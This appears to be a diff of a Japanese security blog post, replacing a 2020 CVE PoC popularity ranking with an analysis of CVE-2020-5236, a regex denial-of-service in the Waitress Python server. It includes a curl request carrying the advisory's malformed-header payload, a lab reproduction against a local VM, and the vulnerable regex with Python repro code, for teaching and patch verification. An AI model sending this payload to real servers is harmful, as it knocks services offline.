@@ -1,6 +1,5 @@
-<div style="text-align: center;">
-[f:id:motikan2010:20191231225911p:plain]
-</div>
+<div style="text-align: center;"><figure class="figure-image figure-image-fotolife" title="いらすとや産のPython">[f:id:motikan2010:20200205224320p:plain]<figcaption>いらすとや産のPython</figcaption></figure></div>  
+
 
 <div class="contents-box">
   <p>[:contents]</p>
@@ -8,45 +7,257 @@
 
 ## はじめに
 
-　2020年も6月が終わり折り返し地点を迎えました。2020年に公表されたCVEが採番されている脆弱性の中から人気なものをGitHubから検索しTOP 10を決めていきます。  
+　<span><a href="https://github.com/advisories/GHSA-73m2-3pwg-5fgc" target="_blank">GitHub Advisory Database - CVE-2020-5236</a></span> で <span class="m-y">緊急度が Critical(最も危険)</span> となっていたので調べてみました。  
 
-検索結果のリポジトリについては下記のリポジトリで管理されています。  
-[https://github.com/nomi-sec/PoC-in-GitHub:embed:cite]  
+<figure class="figure-image figure-image-fotolife" title="GitHubアドバイザリ">[f:id:motikan2010:20200205214545p:plain:w700]<figcaption>GitHub アドバイザリ - CVE-2020-5236</figcaption></figure>
+
+　<span class="m-y">影響を受ける Waitress のバージョンは`1.4.2`のみ</span>です。  
+リリースのタイムラインは以下のようになっています。2020年1月中に導入した人はバージョンを確認してみたほうがよいでしょう。(※本脆弱性以外にも過去のバージョンには他の脆弱性が見つかっているようでした。)
+
+- 1.4.2 2020年 1月 2日 リリース
+- 1.4.3 2020年 2月 2日 リリース  
+
+<span>[Waitress — waitress 1.4.3 documentation](https://docs.pylonsproject.org/projects/waitress/en/latest/#)</span>
+
+### Waitress とは
+
+　あまり耳にしないソフトウェアだと思う「Waitress」は何かと言うと、「WSGI サーバ」らしい。
+
+　WSGI サーバとは何ぞやというと、
+> Web Server Gateway Interface (WSGI; ウィスキー) は、プログラミング言語Pythonにおいて、WebサーバとWebアプリケーション（もしくはWebアプリケーションフレームワーク）を接続するための、標準化されたインタフェース定義である。
+
+by Wikipedia
+
+つまり、  
+　　Django や Bottle といった<span class="m-y">Python言語のWebアプリケーションフレームを動作させる為のアプリケーションサーバ</span>とのこと。  
+　Ruby界隈で例えると Unicorn に近い役割を持っているWebサーバだと思う。  
+
+　WSGI サーバーについてのより詳しい内容は以下の記事が参考になりました。  
+[WSGIアプリケーションとは？WebフレームワークからWSGIサーバーまで - Make組ブログ](https://blog.hirokiky.org/entry/2018/09/30/183840)
+
+　今回脆弱性が発見された「Waitress」はそのようなソフトウェアの1つということです。  
+  
+　どのくらい普及しているのかというと、GitHub の 約12,800個のリポジトリで利用されていることから、そこそこ普及しているWebサーバだと思います。  
+
+<figure class="figure-image figure-image-fotolife">[f:id:motikan2010:20200205215037p:plain:w700]<figcaption>2020/2/5 現在</figcaption></figure>  
+
+　そんな Waitress から ReDoS(Regular expression Denial of Service) の脆弱性が発見されました。  
+本脆弱性の<span class="m-y">再現には特別な設定等は必要なく</span>、さらに<span class="m-y">攻撃方法が容易</span>ということで簡単に再現してしまうことから緊急度が Critical となっていると思います。
+
+[https://github.com/Pylons/waitress:embed:cite]
 
 
-## TOP 10
 
-　TOP 10の算出方法としては、「リポジトリの数」と「それらのリポジトリのスターの数」を使用しています。  
-リポジトリ毎に10ポイント、スター毎に1ポイント 加算される形式で算出しています。  
-　※各脆弱性のタイトルはJVNから引用しています。
+<!-- more -->
 
-### 10位 361 ポイント『複数の Microsoft Windows 製品における権限を昇格される脆弱性(CVE-2020-0787)』
-### 9位 369 ポイント『Apache Tomcat に安全でないデシリアライゼーションの問題(CVE-2020-9484)』
-### 8位 429 ポイント『SaltStack Salt における入力確認に関する脆弱性(CVE-2020-11651)』
-### 7位 434 ポイント『複数の Microsoft Windows 製品のリモートデスクトップゲートウェイにおけるリモートでコードを実行される脆弱性(CVE-2020-0609)』
-### 6位 853 ポイント『Microsoft Exchange Server におけるリモートでコードを実行される脆弱性(CVE-2020-0688)』
-### 5位 856 ポイント『Apache Tomcat の複数の脆弱性に対するアップデート(CVE-2020-1938)』
-### 4位 1045 ポイント『Oracle Fusion Middleware の Oracle WebLogic Server における WLS Core Components に関する脆弱性(CVE-2020-2551)』
-### 3位 1156 ポイント『Sonatype Nexus Repository Manager における不適切なデフォルトパーミッションに関する脆弱性(CVE-2020-11444)』
-### 2位 1662 ポイント『Microsoft Windows CryptoAPI における Elliptic Curve Cryptography (ECC) 証明書の検証不備の脆弱性(CVE-2020-0601)』
-### 1位 3214 ポイント『Microsoft SMBv3 の接続処理にリモートコード実行の脆弱性(CVE-2020-0796)』
 
-### TOP 10 一覧
 
-|| スコア | CVE ID | リポ数| スター合計 |
-| - | - | - | - | - | - |
-|  1位 | 5413 | CVE-2019-0708 / BlueKeep | 111 | 4303 |
-|  2位 | 1868 | CVE-2019-11043 / PHP-FPM |  16 | 1708 |
-|  3位 |  935 | CVE-2019-2725 / Oracle WebLogic |  17 |  765 |
-|  4位 |  785 | CVE-2019-5736 / Docker & runc |  19 |  595 |
-|  5位 |  704 | CVE-2019-2618 / Oracle WebLogic |   6 |  644 |
-|  6位 |  629 | CVE-2019-12586 / Espressif ESP-IDF |   1 |  619 |
-|  7位 |  572 | CVE-2019-6447 / ES File Explorer File Manager |   1 |  562 |
-|  8位 |  545 | CVE-2019-11708 / Firefox & Thunderbird |   1 |  535 |
-|  9位 |  522 | CVE-2019-7304 / Canonical snapd |   2 |  502 |
-| 10位 |  501 | CVE-2019-11510 / Pulse Connect Secure(VPN) |   9 |  411 |
+## 検証
 
+　では実際に Waitress を利用した環境を構築し、本脆弱性を確認していきます。  
+
+### 検証バージョン
+
+　各ツールのバージョンは以下の通りです。  
+Waitress は脆弱性が存在しているバージョンの前後のバージョン(1.4.1、1.4.3)も試しました。  
+
+- Ubuntu 18.04.1
+- Python 3.7.4
+- Bottle 0.12.18
+- Waitress 1.4.1、1.4.2、1.4.3
+
+### 環境構築
+
+　検証環境の構築はこちらの記事を参考にしました。  
+[bottle.py + waitressでPythonのみで動作可能なWebサーバ - Qiita](https://qiita.com/yoichiwo7/items/abcd87c8a8a2e027fc12)
+
+　検証の為に「bottle」と「waitress」のバージョンは上記事とは異なるものを使用しています。  
+  
+　「bottle」は現時点の最新版を使います(任意)。  
+「Waitress」はパッチが適用されていないバージョン`1.4.2`を使います(<b>必須</b>)。  
+  
+　なので各パッケージの取得コマンドは以下のように変更しています。  
+<div class="sm-code">
+```
+curl -OsL https://raw.githubusercontent.com/bottlepy/bottle/0.12.18/bottle.py
+curl -sL https://github.com/Pylons/waitress/archive/v1.4.2.tar.gz | tar xz --strip=1 waitress-1.4.2/waitress
+```  
+</div>
+
+　あと私はVM上で検証していたので外部から接続できるように `run(server="waitress", host='0.0.0.0', port=8080)` の行を `run(server="waitress", host='0.0.0.0', port=8080)` に変更して実行しました。
+
+### ReDoS をしてみる
+
+　Githubのアドバイザリを参照してみると、以下のようにPoCが記載されておりましたので、このシグネチャを用いて検証していきます。  
+送信する「`x`」文字を増やすごとに負荷が増えていくらしいです。  
+> Invalid header example: Bad-header: xxxxxxxxxxxxxxx\x10
+Increasing the number of x's in the header will increase the amount of time Waitress spends in the regular expression engine.
+
+　それでは各バージョンに対して、このヘッダーを含めたリクエストを送信し、どのような挙動になるのかを確認していきます。  
+
+#### 脆弱なバージョン 1.4.2
+
+　curlコマンド用いてシグネチャを含めたリクエストを送信していきます。timeコマンドを付与して応答時間を確認しています。  
+応答時間が長すぎることを避けたい為、「`x`」は適度な数にして送信することにします。  
+
+<div class="sm-code">
+```
+$ time curl "http://192.168.56.13:8080/hello/hogefuga" -H "Bad-header: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`echo -n '\x10'`"
+Bad Request
+
+Invalid header
+
+(generated by waitress)curl "http://192.168.56.13:8080/hello/hogefuga" -H   0.01s user 0.01s system 0% cpu 54.468 total
+```
+</div>  
+
+　応答時間は`約54秒`でした。  
+まだ比較対象はありませんが、Waitress  + Bottleのサンプルアプリケーションの応答時間であることを考えると<span class="m-y">非常に遅く</span>なっています。  
+
+　サーバ側のCPU使用率を見てみると100%になっていました。  
+応答を返すと普通の状態に戻りましたが、攻撃の容易さを考えると非常に危険な脆弱性であることが分かります。  
+<figure class="figure-image figure-image-fotolife" title="CPU使用率 100%">[f:id:motikan2010:20200205222612p:plain:w500]<figcaption>CPU使用率 100%</figcaption></figure>
+
+#### パッチ適用バージョン 1.4.3
+
+　今度はパッチが適用されているバージョンである`1.4.3`に対して検証を行い、脆弱性が修正されていることを確認します。  
+
+　以下のコマンドで Waitress のバージョンを`1.4.3`に変更しています。
+<div class="sm-code">
+```
+$ cd libs/
+$ rm -rf waitress/
+$ curl -sL https://github.com/Pylons/waitress/archive/v1.4.3.tar.gz | tar xz --strip=1 waitress-1.4.3/waitress
+```
+</div>  
+
+　先ほどと同じリクエストを送信してみます。  
+今度は応答時間が`0.026秒`でした。CPU使用率を見てみてもリクエスト送信前と変化はなく、<span class="m-y">本脆弱性は修正されている</span>ということが確認できました。  
+<div class="sm-code">
+```
+$ time curl "http://192.168.56.13:8080/hello/hogefuga" -H "Bad-header: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`echo -n '\x10'`"
+Bad Request
+
+Invalid header
+
+(generated by waitress)curl "http://192.168.56.13:8080/hello/hogefuga" -H   0.01s user 0.01s system 44% cpu 0.026 total
+```
+</div>
+
+#### 脆弱性が存在しないバージョン 1.4.1
+
+　本脆弱性はバージョン`1.4.2`のみに存在しているとのことでしたが、ついでにバージョン`1.4.1`でも試してみました。  
+
+　応答時間は`0.043秒`であり<span class="m-y">情報通り脆弱性は存在していない</span>バージョンとなっていました。  
+<div class="sm-code">
+```
+$ time curl "http://192.168.56.13:8080/hello/hogefuga" -H "Bad-header: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`echo -n '\x10'`"
+Bad Request
+
+Invalid header
+
+(generated by waitress)curl "http://192.168.56.13:8080/hello/hogefuga" -H   0.01s user 0.01s system 24% cpu 0.043 total
+```
+</div>
+
+## 脆弱性を掘り下げる
+　
+　ソースコードレベルでどの部分が問題であったかを確認していきます。
+
+### 修正コミット
+
+　本脆弱性の修正コミット。正規表現部分のみを修正している模様。  
+
+- [Merge pull request from GHSA-73m2-3pwg-5fgc · Pylons/waitress@6e46f9e](https://github.com/Pylons/waitress/commit/6e46f9e3f014d64dd7d1e258eaf626e39870ee1f)
+
+### 修正前 と 修正後 の正規表現
+
+<div class="sm-code">
+```regex
+- 修正前
+^(?P<name>[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,}):[ \t]{0,}?(?P<value>([\x21-\x7e\x80-\xff]([ \t\x21-\x7e\x80-\xff]+[\x21-\x7e\x80-\xff]){,1}){0,})[ \t]{0,}?$
+
+- 修正後
+^(?P<name>[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,}):[ \t]{0,}?(?P<value>(?:[\x21-\x7e\x80-\xff]+(?:[ \t]+[\x21-\x7e\x80-\xff]+)*)?)[ \t]{0,}?$
+```
+</div>
+
+#### 簡単に負荷の大きい正規表現を試す
+
+　問題となっている正規表現も取得できたのでコマンドラインから確認することができます。  
+本脆弱性の原因となっている部分であり、手元で試すだけでも処理が遅く負荷が掛かっていることを実感することができます。  
+  
+　こんな感じで正規表現を動かしてみました。  
+<div class="sm-code">
+```python
+$ python
+>>> import re
+>>> re.compile("^(?P<name>[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,}):[ \t]{0,}?(?P<value>([\x21-\x7e\x80-\xff]([ \t\x21-\x7e\x80-\xff]+[\x21-\x7e\x80-\xff]){,1}){0,})[ \t]{0,}?$").match('Bad-header: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\x10')
+```
+</div>
+
+### 遅い原因を考えてみる
+
+　何故このような正規表現だと遅くなる(負荷がかかる)のでしょうか。  
+遅くしている原因となっている部分を抽出し、影響が少ない範囲でシンプルな正規表現にして何故遅いのかを考えてみます。  
+
+<div class="sm-code">
+```regex
+[ \t]{0,}?(?P<value>([\x21-\x7e\x80-\xff]([ \t\x21-\x7e\x80-\xff]+[\x21-\x7e\x80-\xff]){,1}){0,})[ \t]{0,}
+
+↓ 負荷に影響が少なそうな部分を削除
+
+([\x21-\x7e\x80-\xff]([\x21-\x7e\x80-\xff]+[\x21-\x7e\x80-\xff]){,1}){0,}
+
+↓ 検索文字をわかりやすく
+
+([A]([A]+[A]){,1}){0,}
+
+↓ 繰り返しをシンプルに
+
+([A]([A]+[A])?)*
+```
+</div>  
+
+　正規表現`([A]([A]+[A])?)*`を参考に遅くなる正規表現について考えていきます。
+
+<div class="sm-code">
+```python
+$ python
+>>> import re
+>>> re.compile("^([A]([A]+[A])?)*$").match('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB')
+```
+</div>  
+
+　マッチングに約3秒掛かり、無事遅い正規表現であることが確認できました。  
+
+　<span><a href="https://regex101.com/" target="_blank">Regex101</a></span> を使って正規表現のステップ数を調べてみます。  
+
+　マッチ対象文字列を22文字に減らしていますが、685,829ステップも掛かっている模様です。  
+
+<figure class="figure-image figure-image-fotolife" title="マッチしない場合">[f:id:motikan2010:20200205221015p:plain:w500]<figcaption>マッチしない場合 - 685,829ステップ</figcaption></figure>
+
+　ちなみにマッチする文字列に変更した場合は、13ステップで完了しています。
+<figure class="figure-image figure-image-fotolife" title="マッチする場合">[f:id:motikan2010:20200205221012p:plain:w500]<figcaption>マッチする場合 - 13ステップ</figcaption></figure>  
+
+　ReDoSの原因( = 良くない正規表現)を特筆すると長くなりそうなので今日はここまで \_(:3 」∠ )\_   
+別の記事としてあげたいと思います。  
+
+## 参考
+
+### 本脆弱性の情報
+
+- [NVD - CVE-2020-5236](https://nvd.nist.gov/vuln/detail/CVE-2020-5236)
+- [Catastrophic backtracking in regex allows Denial of Service · CVE-2020-5236 · GitHub Advisory Database](https://github.com/advisories/GHSA-73m2-3pwg-5fgc)
+- [Regular Expression Denial of Service (ReDoS) in waitress | Snyk](https://snyk.io/vuln/SNYK-PYTHON-WAITRESS-544148)
+
+### ReDoSの情報
+
+- [Runaway Regular Expressions: Catastrophic Backtracking](https://www.regular-expressions.info/catastrophic.html)
+- [Online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript](https://regex101.com/)
 
 ## 更新履歴
 
-- 2020年7月4日 新規作成
+- 2020年 2月 5日 新規作成  
+
+
